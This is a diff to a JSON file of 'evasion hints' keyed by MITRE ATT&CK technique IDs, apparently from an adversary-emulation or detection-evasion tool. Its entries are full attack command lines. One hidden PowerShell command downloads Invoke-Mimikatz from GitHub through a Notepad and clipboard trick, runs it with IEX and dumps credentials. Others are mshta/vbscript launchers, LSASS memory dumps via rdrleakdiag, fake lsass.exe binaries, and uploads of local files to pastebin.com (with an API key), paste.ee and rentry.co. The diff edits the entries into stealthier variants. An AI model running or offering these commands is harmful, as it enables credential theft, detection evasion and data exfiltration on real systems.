@@ -3,12 +3,12 @@
     "T1059.001": {
       "evasion_hints": {
         "Image": "C:\\Windows\\System32\\powershell.exe",
-        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\Software\\Microsoft\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Variable _).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Variable _).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Variable _).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Variable _).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Variable _).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\"",
+        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\Software\\Microsoft\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Item Variable:_).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Item Variable:_).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\"",
         "ParentImage": "C:\\Windows\\explorer.exe"
       },
       "evasion_hints_v2": {
         "Image": "C:\\Windows\\System32\\mshta.exe",
-        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\Software\\Microsoft\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Variable _).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Variable _).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Variable _).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Variable _).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Variable _).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\",0)(window.close)\"",
+        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -WindowStyle Hidden -Command \\\"$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\\\Software\\\\Microsoft\\\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Item Variable:_).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Item Variable:_).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\\\"\",0)(window.close())",
         "ParentImage": "C:\\Windows\\System32\\svchost.exe"
       }
     },
@@ -20,49 +20,49 @@
       },
       "evasion_hints_v2": {
         "Image": "C:\\Windows\\System32\\mshta.exe",
-        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $Action = New-ScheduledTaskAction -Execute 'rundll32.exe'; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\\\\Administrators' -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute 'Notepad.exe'; Set-ScheduledTask 'AtomicTaskModifed' -Action $NewAction\",0)(window.close)\"",
+        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $Action = New-ScheduledTaskAction -Execute 'rundll32.exe'; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\\\\Administrators' -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute 'calc.exe'; Set-ScheduledTask 'AtomicTaskModifed' -Action $NewAction\",0)(window.close)\"",
         "ParentImage": "C:\\Windows\\System32\\svchost.exe"
       }
     },
     "T1036.005": {
       "evasion_hints": {
-        "Image": "C:\\Users\\Public\\Downloads\\svchost.exe",
+        "Image": "C:\\Users\\Public\\Downloads\\lsass.exe",
+        "CommandLine": "C:\\Users\\Public\\Downloads\\lsass.exe",
         "ParentImage": "C:\\Windows\\System32\\powershell.exe",
-        "CommandLine": "C:\\Users\\Public\\Downloads\\svchost.exe",
-        "OriginalFileName": "svchost.exe"
+        "ParentCommandLine": "powershell.exe -NoProfile -Command \"Add-Type -TypeDefinition @' public class Test { public static void Main(string[] args) { System.Console.WriteLine(\\\"tweet, tweet\\\") } } '@ -OutputAssembly \\\"C:\\\\Users\\\\Public\\\\Downloads\\\\lsass.exe\\\"; Start-Process -FilePath \\\"C:\\\\Users\\\\Public\\\\Downloads\\\\lsass.exe\\\"\""
       },
       "evasion_hints_v2": {
-        "Image": "C:\\Users\\AppData\\Local\\Temp\\lsass.exe",
+        "Image": "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
+        "CommandLine": "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
         "ParentImage": "C:\\Windows\\System32\\mshta.exe",
-        "CommandLine": "C:\\Users\\AppData\\Local\\Temp\\lsass.exe",
-        "OriginalFileName": "lsass.exe"
+        "ParentCommandLine": "mshta.exe vbscript:CreateObject(\\\"WScript.Shell\\\").Run(\\\"powershell.exe -NoProfile -Command Add-Type -TypeDefinition @' public class Test { public static void Main(string[] args) { System.Console.WriteLine(\\\"tweet, tweet\\\") } } '@ -OutputAssembly C:\\\\AppData\\\\Local\\\\Temp\\\\wmiprvse.exe; Start-Process C:\\\\AppData\\\\Local\\\\Temp\\\\wmiprvse.exe\\\",0)(window.close)\""
       }
     },
     "T1003.001": {
       "evasion_hints": {
         "ParentImage": "C:\\Windows\\System32\\mshta.exe",
         "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
-        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\Users\\Public\\t1003dump /fullmemdmp /wait 1",
-        "ParentCommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -Command Get-Process lsass | Select-Object -ExpandProperty Id | ForEach-Object { & 'C:\\Windows\\System32\\rdrleakdiag.exe' /p $_ /o C:\\Users\\Public\\t1003dump /fullmemdmp /wait 1 }\",0)(window.close)"
+        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\Users\\Public\\Documents\\dump /fullmemdmp /wait 1",
+        "ParentCommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -NoProfile -Command Get-Process lsass | Select-Object -ExpandProperty Id | ForEach-Object { & 'C:\\Windows\\System32\\rdrleakdiag.exe' /p $_ /o C:\\Users\\Public\\Documents\\dump /fullmemdmp /wait 1 }\",0)(window.close)"
       },
       "evasion_hints_v2": {
         "ParentImage": "C:\\Windows\\System32\\wscript.exe",
-        "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
-        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\Users\\AppData\\Local\\Temp\\rdrleak_out /fullmemdmp /wait 1",
+        "Image": "C:\\Windows\\SysWOW64\\rdrleakdiag.exe",
+        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\Users\\AppData\\Local\\Temp\\svc_dump /fullmemdmp /wait 1",
         "ParentCommandLine": "wscript.exe C:\\Users\\Public\\Downloads\\enum.vbs"
       }
     },
     "T1567.003": {
       "evasion_hints": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$apiKey = \\\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\"; $content = Get-Content C:\\Users\\Public\\Documents\\data.txt; $url = \\\"https://pastebin.com/api/api_post.php\\\"; $postData = @{api_dev_key=$apiKey; api_option=\\\"paste\\\"; api_paste_code=$content}; $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData; Write-Host $response\"",
+        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"$apiKey = \\\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\"; $content = Get-Content C:\\Users\\Public\\Documents\\data.txt; $url = \\\"https://pastebin.com/api/api_post.php\\\"; $postData = @{api_dev_key=$apiKey; api_option=\\\"paste\\\"; api_paste_code=$content}; Invoke-RestMethod -Uri $url -Method Post -Body $postData -UseBasicParsing\"",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "ParentCommandLine": "cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ...",
+        "ParentCommandLine": "cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -Command ...",
         "DestinationHostname": "pastebin.com"
       },
       "evasion_hints_v2": {
         "Image": "C:\\Windows\\System32\\mshta.exe",
-        "CommandLine": "mshta.exe vbscript:CreateObject(\\\"MSXML2.XMLHTTP\\\").Open(\\\"POST\\\",\\\"https://pastebin.com/api/api_post.php\\\",False)(CreateObject(\\\"ADODB.Stream\\\").LoadFromFile(\\\"C:\\\\Users\\\\Public\\\\Downloads\\\\exfil.txt\\\"),CreateObject(\\\"MSXML2.XMLHTTP\\\").Send(\\\"api_dev_key=6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0&api_option=paste&api_paste_code=\\\" & CreateObject(\\\"ADODB.Stream\\\").ReadText()))(window.close)",
+        "CommandLine": "mshta.exe vbscript:CreateObject(\\\"MSXML2.XMLHTTP\\\").Open \\\"POST\\\",\\\"https://pastebin.com/api/api_post.php\\\",0;CreateObject(\\\"MSXML2.XMLHTTP\\\").Send \\\"api_dev_key=6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0&api_option=paste&api_paste_code=\\\" & CreateObject(\\\"Scripting.FileSystemObject\\\").OpenTextFile(\\\"C:\\\\Users\\\\Public\\\\Downloads\\\\exfil.txt\\\").ReadAll()(window.close)",
         "ParentImage": "C:\\Windows\\System32\\svchost.exe",
         "ParentCommandLine": "svchost.exe -k netsvcs",
         "DestinationHostname": "pastebin.com"
@@ -73,71 +73,69 @@
     "T1059.001": {
       "evasion_hints": {
         "Image": "C:\\Windows\\System32\\powershell.exe",
-        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\Software\\Microsoft\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Item Variable:_).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Item Variable:_).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\"",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "ParentCommandLine": "cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -Command ..."
+        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\Software\\Microsoft\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Variable _).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Variable _).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Variable _).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Variable _).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Variable _).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\"",
+        "ParentImage": "C:\\Windows\\explorer.exe"
       },
       "evasion_hints_v2": {
         "Image": "C:\\Windows\\System32\\mshta.exe",
-        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\Software\\Microsoft\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Item Variable:_).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Item Variable:_).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\",0)(window.close())",
-        "ParentImage": "C:\\Windows\\System32\\explorer.exe",
-        "ParentCommandLine": "C:\\Windows\\explorer.exe"
+        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\Software\\Microsoft\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Variable _).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Variable _).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Variable _).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Variable _).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Variable _).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\",0)(window.close)\"",
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe"
       }
     },
     "T1053.005": {
       "evasion_hints": {
         "Image": "C:\\Windows\\System32\\cscript.exe",
-        "CommandLine": "cscript.exe C:\\Users\\Public\\Downloads\\task.vbs",
+        "CommandLine": "cscript.exe //nologo C:\\Users\\Public\\Downloads\\task.vbs",
         "ParentImage": "C:\\Windows\\System32\\svchost.exe"
       },
       "evasion_hints_v2": {
         "Image": "C:\\Windows\\System32\\wscript.exe",
-        "CommandLine": "wscript.exe C:\\Users\\Public\\AppData\\Local\\Temp\\schedule.js",
-        "ParentImage": "C:\\Windows\\System32\\lsass.exe"
+        "CommandLine": "wscript.exe C:\\ProgramData\\task.js",
+        "ParentImage": "C:\\Windows\\System32\\rundll32.exe"
       }
     },
     "T1036.005": {
       "evasion_hints": {
-        "Image": "C:\\Users\\AppData\\Local\\Temp\\lsass.exe",
-        "CommandLine": "Add-Type -TypeDefinition @' public class Test { public static void Main(string[] args) { System.Console.WriteLine(\"tweet, tweet\") } }' -OutputAssembly \"C:\\Users\\AppData\\Local\\Temp\\lsass.exe\" ; Start-Process -FilePath \"C:\\Users\\AppData\\Local\\Temp\\lsass.exe\"",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "OriginalFileName": "lsass.exe"
+        "Image": "C:\\Users\\Default\\AppData\\Local\\Temp\\notepad.exe",
+        "CommandLine": "C:\\Users\\Default\\AppData\\Local\\Temp\\notepad.exe",
+        "ParentImage": "C:\\Windows\\System32\\explorer.exe",
+        "ParentCommandLine": "explorer.exe",
+        "OriginalFileName": "notepad.exe"
       },
       "evasion_hints_v2": {
-        "Image": "C:\\ProgramData\\winlogon.exe",
-        "CommandLine": "rundll32.exe shell32.dll ShellExec_RunDLL \"C:\\ProgramData\\winlogon.exe\"",
-        "ParentImage": "C:\\Windows\\System32\\explorer.exe",
-        "OriginalFileName": "winlogon.exe"
+        "Image": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\calc.exe",
+        "CommandLine": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\calc.exe",
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "ParentCommandLine": "svchost.exe -k netsvcs",
+        "OriginalFileName": "calc.exe"
       }
     },
     "T1003.001": {
       "evasion_hints": {
-        "Image": "C:\\Windows\\System32\\rundll32.exe",
-        "CommandLine": "rundll32.exe C:\\Windows\\System32\\rdrleakdiag.exe /p 632 /o C:\\Users\\AppData\\Local\\Temp\\lsass_dump /fullmemdmp",
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "ParentCommandLine": "svchost.exe -k netsvcs"
+        "Image": "C:\\Users\\Public\\AppData\\Local\\Temp\\rdrleakdiag_copy.exe",
+        "CommandLine": "rdrleakdiag_copy.exe /p 632 /o C:\\Users\\Public\\Music\\dump /fullmemdmp",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ParentCommandLine": "cmd.exe /c powershell -NoProfile -Command \"Get-Process lsass | ForEach-Object { Copy-Item C:\\Windows\\System32\\rdrleakdiag.exe C:\\Users\\Public\\AppData\\Local\\Temp\\rdrleakdiag_copy.exe -Force; & C:\\Users\\Public\\AppData\\Local\\Temp\\rdrleakdiag_copy.exe /p $_.Id /o C:\\Users\\Public\\Music\\dump /fullmemdmp }\""
       },
       "evasion_hints_v2": {
-        "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
-        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\ProgramData\\lsass_extract /fullmemdmp /t 1",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "ParentCommandLine": "cmd.exe /c powershell.exe -NoProfile -Command (Get-Process lsass).Id | ForEach-Object { rdrleakdiag.exe /p $_ /o C:\\ProgramData\\lsass_extract /fullmemdmp /t 1 }"
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe shell32.dll ShellExec_RunDLL C:\\Users\\Public\\Downloads\\rdrleakdiag.exe /p 632 /o C:\\ProgramData\\dump /fullmemdmp",
+        "ParentImage": "C:\\Windows\\System32\\explorer.exe",
+        "ParentCommandLine": "explorer.exe"
       }
     },
     "T1567.003": {
       "evasion_hints": {
-        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "Image": "C:\\Users\\Public\\Downloads\\certutil.exe",
         "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
-        "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\Downloads\\exfil.dll,ExportData",
-        "DestinationHostname": "paste.ee"
+        "DestinationHostname": "paste.ee",
+        "CommandLine": "certutil.exe -urlcache -split -f https://paste.ee/api/v1/pastes -o C:\\Users\\Public\\Downloads\\exfil.txt"
       },
       "evasion_hints_v2": {
-        "Image": "C:\\Windows\\System32\\regsvcs.exe",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
         "ParentImage": "C:\\Windows\\System32\\lsass.exe",
-        "ParentCommandLine": "C:\\Windows\\System32\\lsass.exe",
-        "CommandLine": "C:\\Windows\\System32\\regsvcs.exe C:\\Users\\Public\\AppData\\Local\\Temp\\upload.dll",
-        "DestinationHostname": "rentry.co"
+        "DestinationHostname": "rentry.co",
+        "CommandLine": "rundll32.exe url.dll,FileProtocolHandler https://rentry.co/api/v1/new -d secrets"
       }
     }
   }
